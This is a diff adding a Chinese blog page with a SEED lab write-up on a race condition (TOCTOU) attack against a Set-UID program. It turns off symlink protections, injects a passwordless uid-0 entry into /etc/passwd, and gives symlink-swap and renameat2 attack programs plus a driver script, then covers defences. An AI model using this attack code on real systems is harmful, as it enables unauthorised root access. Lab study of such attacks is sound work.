@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SEEDlab—竞争条件漏洞 | Smera1d0&#39;s Blog</title>
+<meta name="keywords" content="软件安全">
+<meta name="description" content="1. 环境设置
+1.1 关闭反制措施
+使用 neofetch 查看 Ubuntu 版本信息，如下所示：
+
+Ubuntu 20.04 引入了一种安全机制，防止 root 用户写入 /tmp 中其他人拥有的文件。使用下面的命令禁用这个安全机制：">
+<meta name="author" content="Mi Yu">
+<link rel="canonical" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-5-%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.eb8f5da85697cd810df09cc87c7f69c1a1690fdc75d0a7bc8bcd70301c4c3cca.css" integrity="sha256-649dqFaXzYEN8JzIfH9pwaFpD9x10Ke8i81wMBxMPMo=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://smera1d0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://smera1d0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://smera1d0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://smera1d0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://smera1d0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-5-%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script type="text/javascript" async
+    src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [['$', '$'], ['\\(', '\\)']],
+                displayMath: [['$$', '$$'], ['\[\[', '\]\]']],
+                processEscapes: true,
+                processEnvironments: true,
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+                TeX: {
+                    equationNumbers: { autoNumber: "AMS" },
+                    extensions: ["AMSmath.js", "AMSsymbols.js"]
+                }
+            },
+            "HTML-CSS": {
+                availableFonts: ["Arial", "TeX"],
+                preferredFont: "TeX",
+                webFont: "TeX"
+            }
+        });
+
+        MathJax.Hub.Queue(function () {
+            
+            
+            
+            var all = MathJax.Hub.getAllJax(), i;
+            for (i = 0; i < all.length; i += 1) {
+                all[i].SourceElement().parentNode.className += ' has-jax';
+            }
+        });
+    </script>
+
+<style>
+    code.has-jax {
+        font: inherit;
+        font-size: 100%;
+        background: inherit;
+        border: inherit;
+        color: #515151;
+    }
+</style>
+<meta property="og:title" content="SEEDlab—竞争条件漏洞" />
+<meta property="og:description" content="1. 环境设置
+1.1 关闭反制措施
+使用 neofetch 查看 Ubuntu 版本信息，如下所示：
+
+Ubuntu 20.04 引入了一种安全机制，防止 root 用户写入 /tmp 中其他人拥有的文件。使用下面的命令禁用这个安全机制：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-5-%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="https://smera1d0.github.io/images/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-01-21T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://smera1d0.github.io/images/papermod-cover.png"/>
+
+<meta name="twitter:title" content="SEEDlab—竞争条件漏洞"/>
+<meta name="twitter:description" content="1. 环境设置
+1.1 关闭反制措施
+使用 neofetch 查看 Ubuntu 版本信息，如下所示：
+
+Ubuntu 20.04 引入了一种安全机制，防止 root 用户写入 /tmp 中其他人拥有的文件。使用下面的命令禁用这个安全机制："/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://smera1d0.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SEEDlab—竞争条件漏洞",
+      "item": "https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-5-%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SEEDlab—竞争条件漏洞",
+  "name": "SEEDlab—竞争条件漏洞",
+  "description": "1. 环境设置 1.1 关闭反制措施 使用 neofetch 查看 Ubuntu 版本信息，如下所示：\nUbuntu 20.04 引入了一种安全机制，防止 root 用户写入 /tmp 中其他人拥有的文件。使用下面的命令禁用这个安全机制：\n",
+  "keywords": [
+    "软件安全"
+  ],
+  "articleBody": "1. 环境设置 1.1 关闭反制措施 使用 neofetch 查看 Ubuntu 版本信息，如下所示：\nUbuntu 20.04 引入了一种安全机制，防止 root 用户写入 /tmp 中其他人拥有的文件。使用下面的命令禁用这个安全机制：\n// On Ubuntu 20.04, use the following: $ sudo sysctl -w fs.protected_symlinks=0 $ sudo sysctl fs.protected_regular=0 然后将漏洞程序 vulp.c 编译并设置为 Set-UID 程序：\n2. Task 1：选择目标 Ubuntu live CD 中有一个用于无口令帐户的 magic 值 U6aMy0wojraho（第 6 个字符是零而非字母 O）。如果我们把这个值放在用户条目的口令字段中，我们只需要在提示输入口令时敲击回车键即可登录。\n任务 为了验证 magic 值口令是否有效，我们（作为超级用户）手动将以下条目添加到/etc/passwd 文件的末尾。请在报告中说明你是否可以在不键入口令的情况下登录 test 账户，并检查你是否具有 root 权限。\n将以下内容添加进 /etc/passwd 文件中：\ntest:U6aMy0wojraho:0:0:test:/root:/bin/bash 切换到 test 账户，无需键入口令，并且具有 root 权限。\n3. Task 2：发起竞争条件攻击 3.1 Task 2.A：模拟一个缓慢的机器 假设机器非常慢，在 access() 和 fopen() 调用之间有一个 10 秒的时间窗口。为了模拟这种情况， 我们在它们之间添加了 sleep(10)。\n#include #include #include #include int main() { char* fn = \"/tmp/XYZ\"; char buffer[60]; FILE* fp; /* get user input */ scanf(\"%50s\", buffer); if (!access(fn, W_OK)) { sleep(10); //\u003c- 10s time window fp = fopen(fn, \"a+\"); if (!fp) { perror(\"Open failed\"); exit(1); } fwrite(\"\\n\", sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); } else { printf(\"No permission \\n\"); } return 0; } 然后重新编译并设置为 Set-UID 程序，并创建一个 /tmp/XYZ 文件。\n运行程序时，输入 test:U6aMy0wojraho:0:0:test:/root:/bin/bash，利用 10 秒的时间窗口，将 /tmp/XYZ 设置为指向 /etc/passwd 的符号链接，使用命令：\nln -sf /etc/passwd /tmp/XYZ (f表示如果存在链接，则先删除链接) 如下所示：\n然后此时查看 /etc/passwd 的内容，发现 test:U6aMy0wojraho:0:0:test:/root:/bin/bash 已经被写入。\n切换 test 用户，无需密码即可获得 root 权限：\n3.2 Task 2.B：进行真实攻击 首先删除 sleep(10) 重新编译并设置成 Set-UID 程序。\n3.2.1 编写攻击程序 我们可以使用以下的函数删除链接和创建链接：\nunlink(\"/tmp/XYZ\"); symlink(\"/etc/passwd\",\"/tmp/XYZ\"); 由于 Linux 不允许在已经存在链接的时候创建链接，所以我们每次在创建链接前都需要先删除链接。\n于是我们可以写出这样的攻击脚本：\n// attack.c #include int main(){ while(1){ unlink(\"/tmp/XYZ\"); symlink(\"/etc/passwd\",\"/tmp/XYZ\"); usleep(100); } return 0; } 通过一个 while 循环，不断的删除链接和创建 tmp/XYZ 和 /etc/passwd 之间的链接。\n然后编写 target_process.sh ，利用 echo 和管道符进行程序的输入。\n#!/bin/bash CHECK_FILE=\"ls -l /etc/passwd\" old=$($CHECK_FILE) new=$($CHECK_FILE) while [ \"$old\" == \"$new\" ] do echo \"test:U6aMy0wojraho:0:0:test:/root:/bin/bash\" | ./vulp new=$($CHECK_FILE) done echo \"STOP... The passwd file has been changed\" 利用 ls -l /etc/passwd 输出的文件修改时间，如果文件修改时间发生变化，说明竞争条件漏洞利用成功，/etc/passwd 文件被修改，此时停止脚本的运行。\n3.2.2 运行漏洞程序并观察结果 首先运行 attack 攻击脚本。 然后运行 target_process.sh 脚本，不断的运行漏洞程序。 3.2.3 验证是否成功 查看 /etc/passwd ，发现 test:U6aMy0wojraho:0:0:test:/root:/bin/bash 成功写入：\n切换 test 用户，无需密码成功获得 root 权限：\n3.3 Task 2.C：一种改进的攻击方法 在 Task 2.B 中，我们的攻击可能失败，原因是我们编写的攻击脚本也存在着竞争条件漏洞，当执行 unlink 操作删除 /tmp/XYZ 之后，如果执行了 fopen 操作，就会创建一个所有者为 root 的 /tmp/XYZ ，下一次 unlink 操作就无法删除 /tmp/XYZ。这是因为 /tmp 文件夹上有一个“粘滞”位，意为只有文件的所有者才能删除该文件，即使该文件夹可写。\n// attack.c unlink(\"/tmp/XYZ\"); \u003c- 以 seed 身份 unlink // vulp.c fp = fopen(fn, \"a+\"); \u003c- 以 root 身份 fopen，文件所有者变为 root // attack.c unlink(\"/tmp/XYZ\"); \u003c- 以 seed 身份无法 unlink 为了解决这个问题，我们需要将 unlink 和 symlink 操作原子化，幸运的是，有一个系统调用允许我们实现这一点。更准确地说，它允许我们原子地交换两个符号链接。下面的程序首先创建两个符号链接 /tmp/XYZ 和 /tmp/ABC，然后使用 renameat2 系统调用来原子地交换它们。这允许我们在不引入任何竞争条件的情况下更改 /tmp/XYZ 指向的内容。\n我们可以写入如下所示的改进的攻击脚本：\n//attack_new.c #define _GNU_SOURCE #include #include int main() { unsigned int flags = RENAME_EXCHANGE; while(1){ unlink(\"/tmp/XYZ\"); symlink(\"/dev/null\", \"/tmp/XYZ\"); usleep(100); unlink(\"/tmp/ABC\"); symlink(\"/etc/passwd\", \"/tmp/ABC\"); usleep(100); renameat2(0, \"/tmp/XYZ\", 0, \"/tmp/ABC\", flags); } return 0; } 使用上面的攻击脚本再次尝试攻击：\n切换 test 用户，无需密码成功获得 root 权限：\n4. Task 3：预防措施 4.1 Task 3.A：应用最小权限原则 读取 /tmp/XYZ 文件并不需要 root 权限，根据最小权限原则，如果我们不需要 root 权限，我们就要禁用这个权限，因此我们可以使用 seteuid 系统调用暂时禁用 root 权限，确保进程的权限与当前执行者的权限一致，修改后的代码如下所示：\n#include #include #include #include int main() { char* fn = \"/tmp/XYZ\"; char buffer[60]; FILE* fp; seteuid(getuid()); //修改进程的euid为执行者的uid /* get user input */ scanf(\"%50s\", buffer); if (!access(fn, W_OK)) { fp = fopen(fn, \"a+\"); if (!fp) { perror(\"Open failed\"); exit(1); } fwrite(\"\\n\", sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); } else { printf(\"No permission \\n\"); } return 0; } 编译并设为 Set-UID 程序，再次执行攻击脚本。\n**观察结果：**发现攻击失败，出现了 Open failed: Permission denied。\n**解释：**由于进程的 euid 被设置成了 seed ，通过了 access() 函数的检测之后，就算修改了符号链接，也无法打开 /etc/passwd ，原因是 /etc/passwd 是 root 可写的，seed 不可写，因此会输出 Open failed: Permission denied。\n4.2 Task 3.B：使用 Ubuntu 内置方案 Ubuntu 10.10 和更高版本附带了一个内置的防止竞争条件攻击的保护方案。使用下面的命令重新开启保护：\n// On Ubuntu 16.04 and 20.04, use the following command: $ sudo sysctl -w fs.protected_symlinks=1 // On Ubuntu 12.04, use the following command: $ sudo sysctl -w kernel.yama.protected_sticky_symlinks=1 再次运行攻击脚本。\n**观察结果：**发现攻击失败，输出 Open failed: Permission denied。\n查阅 Linux Kernel 的文档（https://www.kernel.org/doc/html/latest/admin-guide/sysctl/fs.html#protected-symlinks）发现了该保护方案的机制：\nQ:（1）该保护方案是如何工作的？\nA：\n结合 Linux Kernel 的文档和 SEED book，设这样一个三元组：（跟随者，目录所有者，符号链接所有者），跟随者是进程的有效用户，目录所有者是目录的拥有者，符号链接所有者是创建该符号链接的用户，当符号链接的所有者与跟随者相同，或者与目录所有者相同，fopen 的操作就会被允许，否则 fopen 的操作就会失败。\n发起攻击的时候，符号链接的所有者是 seed，而 /tmp 目录的所有者和跟随者都是 root，因此 fopen 的操作会失败，所以会输出 Open failed: Permission denied，进而攻击失败。\nQ:（2）这个方案有什么局限性？\nA：\n如果建立符号链接的文件所在目录的所有者是 seed，那么这个保护机制将会失败。 限制了系统的灵活性，如果一个 root 用户想通过一个程序访问一个 root 拥有的目录下的 seed 拥有的符号链接，那么就会访问失败。 在某些场景下可能带来兼容性问题，如果其他程序依赖不同用户下的符号链接机制，这个程序可能无法正常运行。 5. 思考题 Q1\t下面的 Set-UID 程序是否有竞争条件漏洞？并请解释。\nif (!access(\"/etc/passwd\", W_OK)) { /* the real user has the write permission*/ f = open(\"/tmp/X\", O_WRITE); write_to_file(f); } else { /* the real user does not have the write permission */ fprintf(stderr , \"Permission denied\\n\"); } 存在竞争条件漏洞。\n解释：首先，if 判断会检查用户对 /etc/passwd 是否有写权限，而且 access() 函数检查的是用户的真实 id，并且普通用户是无法将 /etc/passwd 设置符号链接的，所以能通过 if 判断的都是 root 用户，这让我感到迷惑，都拥有 root 权限了，还需要通过修改符号链接的方式进行攻击吗？\n通过了 if 判断后，攻击者可以将 /tmp/X 设置为指向攻击者想要写入的文件的符号链接，这样执行open 就会打开攻击者想要写入的文件，并执行 write_to_file(f) 对该文件进行写入。\n存在漏洞的原因是检查文件和打开文件是两个分离的操作，攻击者可以利用中间的时间窗口对文件进行替换，进行攻击。\n",
+  "wordCount" : "2675",
+  "inLanguage": "zh",
+  "datePublished": "2024-01-21T00:00:00Z",
+  "dateModified": "2024-01-21T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mi Yu"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-5-%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Smera1d0's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://smera1d0.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://smera1d0.github.io/" accesskey="h" title="Smera1d0&#39;s Blog (Alt + H)">Smera1d0&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://smera1d0.github.io/en/" title="English"
+                            aria-label="English">English</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://smera1d0.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://github.com/adityatelange/hugo-PaperMod/wiki/" title="WiKi">
+                    <span>WiKi</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://smera1d0.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://smera1d0.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      SEEDlab—竞争条件漏洞
+    </h1>
+    <div class="post-meta"><span title='2024-01-21 00:00:00 +0000 UTC'>一月 21, 2024</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Mi Yu&nbsp;|&nbsp;<a href="https://github.com/smera1d0/smera1d0.github.io/tree/main/posts/posts/%e3%80%90%e8%bd%af%e4%bb%b6%e5%ae%89%e5%85%a8%e3%80%91%e5%ae%9e%e9%aa%8c%205%20%e7%ab%9e%e4%ba%89%e6%9d%a1%e4%bb%b6%e6%bc%8f%e6%b4%9e.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#1-%e7%8e%af%e5%a2%83%e8%ae%be%e7%bd%ae" aria-label="1. 环境设置">1. 环境设置</a><ul>
+                        
+                <li>
+                    <a href="#11-%e5%85%b3%e9%97%ad%e5%8f%8d%e5%88%b6%e6%8e%aa%e6%96%bd" aria-label="1.1 关闭反制措施">1.1 关闭反制措施</a></li></ul>
+                </li>
+                <li>
+                    <a href="#2-task-1%e9%80%89%e6%8b%a9%e7%9b%ae%e6%a0%87" aria-label="2. Task 1：选择目标">2. Task 1：选择目标</a></li>
+                <li>
+                    <a href="#3-task-2%e5%8f%91%e8%b5%b7%e7%ab%9e%e4%ba%89%e6%9d%a1%e4%bb%b6%e6%94%bb%e5%87%bb" aria-label="3. Task 2：发起竞争条件攻击">3. Task 2：发起竞争条件攻击</a><ul>
+                        
+                <li>
+                    <a href="#31-task-2a%e6%a8%a1%e6%8b%9f%e4%b8%80%e4%b8%aa%e7%bc%93%e6%85%a2%e7%9a%84%e6%9c%ba%e5%99%a8" aria-label="3.1 Task 2.A：模拟一个缓慢的机器">3.1 Task 2.A：模拟一个缓慢的机器</a></li>
+                <li>
+                    <a href="#32-task-2b%e8%bf%9b%e8%a1%8c%e7%9c%9f%e5%ae%9e%e6%94%bb%e5%87%bb" aria-label="3.2 Task 2.B：进行真实攻击">3.2 Task 2.B：进行真实攻击</a><ul>
+                        
+                <li>
+                    <a href="#321-%e7%bc%96%e5%86%99%e6%94%bb%e5%87%bb%e7%a8%8b%e5%ba%8f" aria-label="3.2.1 编写攻击程序">3.2.1 编写攻击程序</a></li>
+                <li>
+                    <a href="#322-%e8%bf%90%e8%a1%8c%e6%bc%8f%e6%b4%9e%e7%a8%8b%e5%ba%8f%e5%b9%b6%e8%a7%82%e5%af%9f%e7%bb%93%e6%9e%9c" aria-label="3.2.2 运行漏洞程序并观察结果">3.2.2 运行漏洞程序并观察结果</a></li>
+                <li>
+                    <a href="#323-%e9%aa%8c%e8%af%81%e6%98%af%e5%90%a6%e6%88%90%e5%8a%9f" aria-label="3.2.3 验证是否成功">3.2.3 验证是否成功</a></li></ul>
+                </li>
+                <li>
+                    <a href="#33--task-2c%e4%b8%80%e7%a7%8d%e6%94%b9%e8%bf%9b%e7%9a%84%e6%94%bb%e5%87%bb%e6%96%b9%e6%b3%95" aria-label="3.3  Task 2.C：一种改进的攻击方法">3.3  Task 2.C：一种改进的攻击方法</a></li></ul>
+                </li>
+                <li>
+                    <a href="#4-task-3%e9%a2%84%e9%98%b2%e6%8e%aa%e6%96%bd" aria-label="4. Task 3：预防措施">4. Task 3：预防措施</a><ul>
+                        
+                <li>
+                    <a href="#41-task-3a%e5%ba%94%e7%94%a8%e6%9c%80%e5%b0%8f%e6%9d%83%e9%99%90%e5%8e%9f%e5%88%99" aria-label="4.1 Task 3.A：应用最小权限原则">4.1 Task 3.A：应用最小权限原则</a></li>
+                <li>
+                    <a href="#42-task-3b%e4%bd%bf%e7%94%a8-ubuntu-%e5%86%85%e7%bd%ae%e6%96%b9%e6%a1%88" aria-label="4.2 Task 3.B：使用 Ubuntu 内置方案">4.2 Task 3.B：使用 Ubuntu 内置方案</a></li></ul>
+                </li>
+                <li>
+                    <a href="#5-%e6%80%9d%e8%80%83%e9%a2%98" aria-label="5. 思考题">5. 思考题</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="1-环境设置">1. 环境设置<a hidden class="anchor" aria-hidden="true" href="#1-环境设置">#</a></h2>
+<h3 id="11-关闭反制措施">1.1 关闭反制措施<a hidden class="anchor" aria-hidden="true" href="#11-关闭反制措施">#</a></h3>
+<p>使用 neofetch 查看 Ubuntu 版本信息，如下所示：</p>
+<img src="https://s2.loli.net/2024/11/24/wm3OTqWn4YuVAH1.png" alt="image-20241124110138581" style="zoom: 50%;" />
+<p>Ubuntu 20.04 引入了一种安全机制，防止 root 用户写入 /tmp 中其他人拥有的文件。使用下面的命令禁用这个安全机制：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">// On Ubuntu 20.04, use the following:
+</span></span><span class="line"><span class="cl">$ sudo sysctl -w fs.protected_symlinks<span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">$ sudo sysctl fs.protected_regular<span class="o">=</span><span class="m">0</span>
+</span></span></code></pre></div><img src="https://s2.loli.net/2024/11/24/Zz3GQMPB57argex.png" alt="image-20241124110414869" style="zoom:67%;" />
+<p>然后将漏洞程序 <code>vulp.c</code> 编译并设置为 Set-UID 程序：</p>
+<img src="https://s2.loli.net/2024/11/24/ahoTk8Ecmv2DnC4.png" alt="image-20241124110732466" style="zoom:67%;" />
+<h2 id="2-task-1选择目标">2. Task 1：选择目标<a hidden class="anchor" aria-hidden="true" href="#2-task-1选择目标">#</a></h2>
+<p>Ubuntu live CD 中有一个用于无口令帐户的 magic 值 U6aMy0wojraho（第 6 个字符是零而非字母 O）。如果我们把这个值放在用户条目的口令字段中，我们只需要在提示输入口令时敲击回车键即可登录。</p>
+<blockquote>
+<p><strong>任务</strong>    为了验证 magic 值口令是否有效，我们（作为超级用户）手动将以下条目添加到/etc/passwd 文件的末尾。请在报告中说明你是否可以在不键入口令的情况下登录 test 账户，并检查你是否具有 root 权限。</p>
+</blockquote>
+<p>将以下内容添加进 <code>/etc/passwd</code> 文件中：</p>
+<pre tabindex="0"><code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+</code></pre><img src="https://s2.loli.net/2024/11/24/EcdGiUzgb2j7N8X.png" alt="image-20241124111435685" style="zoom:67%;" />
+<p>切换到 test 账户，无需键入口令，并且具有 root 权限。</p>
+<img src="https://s2.loli.net/2024/11/24/j8uP9cK3LZvpJ7o.png" alt="image-20241124111737525" style="zoom:67%;" />
+<h2 id="3-task-2发起竞争条件攻击">3. Task 2：发起竞争条件攻击<a hidden class="anchor" aria-hidden="true" href="#3-task-2发起竞争条件攻击">#</a></h2>
+<h3 id="31-task-2a模拟一个缓慢的机器">3.1 Task 2.A：模拟一个缓慢的机器<a hidden class="anchor" aria-hidden="true" href="#31-task-2a模拟一个缓慢的机器">#</a></h3>
+<p>假设机器非常慢，在 <code>access()</code> 和 <code>fopen()</code> 调用之间有一个 10 秒的时间窗口。为了模拟这种情况， 我们在它们之间添加了 <code>sleep(10)</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">fn</span> <span class="o">=</span> <span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">60</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* get user input */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%50s&#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">access</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">W_OK</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>     <span class="c1">//&lt;- 10s time window
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s">&#34;a+&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Open failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fwrite</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fwrite</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
